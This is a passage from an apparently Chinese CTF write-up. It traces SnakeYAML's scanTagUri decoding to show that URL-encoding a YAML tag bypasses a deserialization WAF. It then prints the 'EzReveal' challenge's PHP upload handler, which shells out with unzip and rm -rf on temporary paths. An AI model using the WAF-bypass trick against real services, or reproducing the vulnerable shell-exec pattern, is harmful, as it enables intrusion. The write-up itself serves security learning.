+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">parseNode</span><span class="p">:</span><span class="mi">489</span><span class="p">,</span> <span class="n">ParserImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">access</span><span class="o">$</span><span class="mi">1400</span><span class="p">:</span><span class="mi">121</span><span class="p">,</span> <span class="n">ParserImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">produce</span><span class="p">:</span><span class="mi">395</span><span class="p">,</span> <span class="n">ParserImpl</span><span class="o">$</span><span class="n">ParseBlockNode</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">peekEvent</span><span class="p">:</span><span class="mi">166</span><span class="p">,</span> <span class="n">ParserImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">peek</span><span class="p">:</span><span class="mi">59</span><span class="p">,</span> <span class="n">CommentEventsCollector</span><span class="o">$</span><span class="mi">1</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">comments</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">peek</span><span class="p">:</span><span class="mi">45</span><span class="p">,</span> <span class="n">CommentEventsCollector</span><span class="o">$</span><span class="mi">1</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">comments</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">collectEvents</span><span class="p">:</span><span class="mi">140</span><span class="p">,</span> <span class="n">CommentEventsCollector</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">comments</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">collectEvents</span><span class="p">:</span><span class="mi">119</span><span class="p">,</span> <span class="n">CommentEventsCollector</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">comments</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">composeNode</span><span class="p">:</span><span class="mi">157</span><span class="p">,</span> <span class="n">Composer</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">composer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getNode</span><span class="p">:</span><span class="mi">115</span><span class="p">,</span> <span class="n">Composer</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">composer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getSingleNode</span><span class="p">:</span><span class="mi">142</span><span class="p">,</span> <span class="n">Composer</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">composer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getSingleData</span><span class="p">:</span><span class="mi">151</span><span class="p">,</span> <span class="n">BaseConstructor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">constructor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">loadFromReader</span><span class="p">:</span><span class="mi">491</span><span class="p">,</span> <span class="n">Yaml</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">load</span><span class="p">:</span><span class="mi">416</span><span class="p">,</span> <span class="n">Yaml</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>往前追溯tag的实现并打断点重新调试：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813115732298.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813115732298"
+	
+	
+></p>
+<p>这里是先从tagToken中获取value，然后再从中获取到suffix并拼接成为tag，并且可以看到此时的tagToken的变量的值已经解码了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813120000820.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813120000820"
+	
+	
+></p>
+<p>跟进getValue()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813115836046.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813115836046"
+	
+	
+></p>
+<p>这里打一个断点往前查看赋值情况：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813120345749.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813120345749"
+	
+	
+></p>
+<p>可以看到对value的赋值以及TagToken的实例化，分析前面的代码，看到对suffix赋值调用了一个scanTagUri()方法，跟进查看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813120558668.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813120558668"
+	
+	
+></p>
+<p>注释中有对这个scanTagUri()方法的说明：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813120707678.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813120707678"
+	
+	
+></p>
+<p>扫描标签中的URI，其实就是对其中进行了url编码的字符进行处理，这个方法的逻辑就是利用chunk来储存字符，当遇到%字符，也就是url编码了，就会先将前面累计的普通字符写入chunks，然后再写入url解码后的字符。关键点就在于上文标记出来的scanUriEscapes()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813122548805.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813122548805"
+	
+	
+></p>
+<p>关键的解码的地方就是如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">byte</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="na">prefix</span><span class="p">(</span><span class="n">2</span><span class="p">),</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">buff</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">code</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就是读取%后面两个十六进制字符，然后将其转换成字节，比如我这里的J就是%4a，那么就是0x4a，对应ascii就是J：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813122932030.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813122932030"
+	
+	
+></p>
+<p>后面再调用UriEncoder.decode将其解码成字符并返回，然后就放入到chunks中，最后调用chunks.toString()返回以字符串形式返回赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813123139054.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813123139054"
+	
+	
+></p>
+<p>过程如上，所以我们可以对标签进行一次url编码，从而达到绕过的效果。</p>
+<p>————————————</p>
+<p>最后，值得一提的是虽然在参数传递时传入了startMark：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813124408122.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813124408122"
+	
+	
+></p>
+<p>但是但是主要起作用的还是直接从reader中获取的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813124545929.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813124545929"
+	
+	
+></p>
+<p>方法定义如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813124704245.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813124704245"
+	
+	
+></p>
+<p>而reader存储的其实就是我们传入的参数：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813125103320.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813125103320"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813124955051.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813124955051"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813125021591.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813125021591"
+	
+	
+></p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250813125034202.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250813125034202"
+	
+	
+></p>
+<p>调用栈如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">scanTagUri</span><span class="p">:</span><span class="mi">2291</span><span class="p">,</span> <span class="n">ScannerImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">scanner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">scanTag</span><span class="p">:</span><span class="mi">1620</span><span class="p">,</span> <span class="n">ScannerImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">scanner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fetchTag</span><span class="p">:</span><span class="mi">995</span><span class="p">,</span> <span class="n">ScannerImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">scanner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fetchMoreTokens</span><span class="p">:</span><span class="mi">414</span><span class="p">,</span> <span class="n">ScannerImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">scanner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">checkToken</span><span class="p">:</span><span class="mi">251</span><span class="p">,</span> <span class="n">ScannerImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">scanner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">produce</span><span class="p">:</span><span class="mi">214</span><span class="p">,</span> <span class="n">ParserImpl</span><span class="o">$</span><span class="n">ParseImplicitDocumentStart</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">peekEvent</span><span class="p">:</span><span class="mi">166</span><span class="p">,</span> <span class="n">ParserImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">checkEvent</span><span class="p">:</span><span class="mi">156</span><span class="p">,</span> <span class="n">ParserImpl</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getSingleNode</span><span class="p">:</span><span class="mi">141</span><span class="p">,</span> <span class="n">Composer</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">composer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getSingleData</span><span class="p">:</span><span class="mi">151</span><span class="p">,</span> <span class="n">BaseConstructor</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="o">.</span><span class="n">constructor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">loadFromReader</span><span class="p">:</span><span class="mi">491</span><span class="p">,</span> <span class="n">Yaml</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">load</span><span class="p">:</span><span class="mi">416</span><span class="p">,</span> <span class="n">Yaml</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">yaml</span><span class="o">.</span><span class="n">snakeyaml</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面发现这是一个trick：</p>
+<p><a class="link" href="https://liotree.github.io/2025/02/09/spel%E6%B3%A8%E5%85%A5%E5%92%8Csnakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96waf%20bypass%20trick/"  target="_blank" rel="noopener"
+    >https://liotree.github.io/2025/02/09/spel%E6%B3%A8%E5%85%A5%E5%92%8Csnakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96waf%20bypass%20trick/</a></p>
+<h3 id="ezreveal">EzReveal
+</h3><p>给了附件，一个文件上传的页面，关键代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;REL_FILENAME&#39;</span><span class="p">,</span> <span class="s1">&#39;word/_rels/document.xml.rels&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">reSponYour</span><span class="p">(</span><span class="nv">$code</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">http_response_code</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nv">$msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* sanity checks */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">405</span><span class="p">,</span> <span class="s1">&#39;Invalid request method.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Please upload a file.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="s1">&#39;Upload error.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Please upload a Word document!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* processing uploaded Word - valid document contains relationship table */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$zipFilename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;input&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$zipFilename</span><span class="p">)</span> <span class="o">!==</span> <span class="k">true</span> <span class="o">||</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">locateName</span><span class="p">(</span><span class="nx">REL_FILENAME</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;File is not a valid Word document.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$relsDom</span> <span class="o">=</span> <span class="nx">simplexml_load_string</span><span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">getFromName</span><span class="p">(</span><span class="nx">REL_FILENAME</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$relsDom</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">reSponYour</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Invalid object relationship table. Document may be corrupted.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* extract document&#39;s &#34;media&#34; folder into a temporary directory */</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tmpDir</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;unzip </span><span class="si">$zipFilename</span><span class="s2"> </span><span class="se">\&#34;</span><span class="s2">word/media*</span><span class="se">\&#34;</span><span class="s2"> -d </span><span class="se">\&#34;</span><span class="si">$tmpDir\</span><span class="s2">&#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">function cleanup(</span><span class="si">$tmpDir</span><span class="s2">) { shell_exec(&#34;</span><span class="nx">rm</span> <span class="o">-</span><span class="nx">rf</span> <span class="nv">$tmpDir</span><span class="s2">&#34;); }
+</span></span></span><span class="line"><span class="cl"><span class="s2">register_shutdown_function(&#39;cleanup&#39;, </span><span class="si">$tmpDir</span><span class="s2">); // cleanup in the end
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">chdir(&#34;</span><span class="nv">$tmpDir</span><span class="o">/</span><span class="nx">word</span><span class="o">/</span><span class="nx">media</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">ini_set(&#39;open_basedir&#39;, &#39;.&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">$messages</span><span class="s2"> = [];
+</span></span></span><span class="line"><span class="cl"><span class="s2">foreach(</span><span class="si">$relsDom-&gt;Relationship</span><span class="s2"> as </span><span class="si">$rel</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if(</span><span class="si">$rel[&#39;Type&#39;]</span><span class="s2"> == &#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#39;) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        if (!str_starts_with(</span><span class="si">$rel[&#39;Target&#39;]</span><span class="s2">, &#39;media/&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="s2">            continue;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$filename</span><span class="s2"> = substr(</span><span class="si">$rel[&#39;Target&#39;]</span><span class="s2">, 6);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$file</span><span class="s2"> = @file_get_contents(</span><span class="si">$filename</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        if (</span><span class="si">$file</span><span class="s2"> === false) // Object relationship table points to inexistent file. Document may be corrupted
+</span></span></span><span class="line"><span class="cl"><span class="s2">            break;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$result</span><span class="s2"> = @zlib_decode(</span><span class="si">$file</span><span class="s2">); // This will expose them hackers!
+</span></span></span><span class="line"><span class="cl"><span class="s2">        if (</span><span class="si">$result</span><span class="s2"> !== false)
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$messages</span><span class="s2">[] = </span><span class="si">$result</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">// cleanup
+</span></span></span><span class="line"><span class="cl"><span class="s2">system(&#34;</span><span class="nx">rm</span> <span class="o">-</span><span class="nx">rf</span> <span class="nv">$tmpDir</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">   &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;html lang=&#34;</span><span class="nx">en</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta charset=&#34;</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta name=&#34;</span><span class="nx">viewport</span><span class="s2">&#34; content=&#34;</span><span class="nx">width</span><span class="o">=</span><span class="nx">device</span><span class="o">-</span><span class="nx">width</span><span class="p">,</span> <span class="nx">initial</span><span class="o">-</span><span class="nx">scale</span><span class="o">=</span><span class="mf">1.0</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;title&gt;zStego - Results&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;link href=&#34;</span><span class="o">./</span><span class="nx">bootstrap</span><span class="o">.</span><span class="nx">min</span><span class="o">.</span><span class="nx">css</span><span class="s2">&#34; rel=&#34;</span><span class="nx">stylesheet</span><span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;body class=&#34;</span><span class="nx">bg</span><span class="o">-</span><span class="nx">light</span><span class="s2">&#34;&gt;
